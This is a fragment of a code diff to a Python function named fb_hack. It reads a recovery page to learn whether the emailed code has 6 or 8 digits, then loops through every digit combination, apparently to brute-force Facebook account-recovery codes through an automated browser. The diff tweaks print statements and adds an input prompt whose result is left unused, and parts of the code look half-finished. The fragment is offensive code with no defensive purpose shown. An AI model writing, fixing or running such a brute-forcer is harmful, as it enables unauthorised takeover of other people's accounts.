@@ -76,10 +76,10 @@ def fb_hack(email, codex, respect):
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   eightdigits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   if sixdigits != test:
-    print(sixdigits)
+    print("sixdigits")
     respect = int(6)
   else:
-    print(eightdigits)
+    print("eightdigits")
     respect = int(8)
   for combination in itertools.product(range(10), repeat=int(respect)):
     p = (''.join(map(str, combination)))
@@ -120,7 +120,9 @@ def fb_hack(email, codex, respect):
       if taw != "None":
         print(yo)
       else:
-        print(yot)
+        selection = input()
+        searchbox = driver.find_element(by = By.NAME, value = selection)
+        
         respect = 0
         break
       sleepy(30)
